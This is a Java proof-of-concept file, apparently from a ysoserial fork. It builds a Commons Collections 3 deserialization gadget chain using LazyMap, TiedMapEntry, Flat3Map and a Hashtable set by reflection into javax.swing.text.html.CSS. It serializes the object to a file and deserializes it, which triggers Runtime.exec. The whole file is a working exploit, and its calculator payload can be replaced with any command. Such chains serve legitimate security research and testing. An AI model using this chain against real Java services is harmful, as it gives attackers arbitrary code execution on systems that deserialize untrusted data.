package ysoserial.payloads.tabbyGadgetChains.CommonCollections3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.Flat3Map;
import org.apache.commons.collections.map.LazyMap;

import javax.swing.text.html.CSS;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;

public class CC3_Poc12 {
    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"" +
                        "/Applications/Calculator.app/Contents/MacOS/Calculator"})});
        HashMap innermap = new HashMap();
        LazyMap outerMap = (LazyMap)LazyMap.decorate(innermap,chain);
        TiedMapEntry tiedmap = new TiedMapEntry(outerMap,123);
        Flat3Map flat3Map = new Flat3Map(outerMap);
        flat3Map.put(tiedmap,"1");
        outerMap.remove(123);
        javax.swing.text.html.CSS css = new CSS();
        Field field=css.getClass().getDeclaredField("valueConvertor");
        field.setAccessible(true);//暴力反射


        Hashtable hashtable = new Hashtable();
        hashtable.put(flat3Map, flat3Map);
        hashtable.put(flat3Map, 1);
        hashtable.put(flat3Map, 2);
        hashtable.put(flat3Map, 3);
        field.set(css,hashtable);
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccf3"));
        outputStream.writeObject(css);
        outputStream.close();


        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccf3"));
        inputStream.readObject();


    }
}
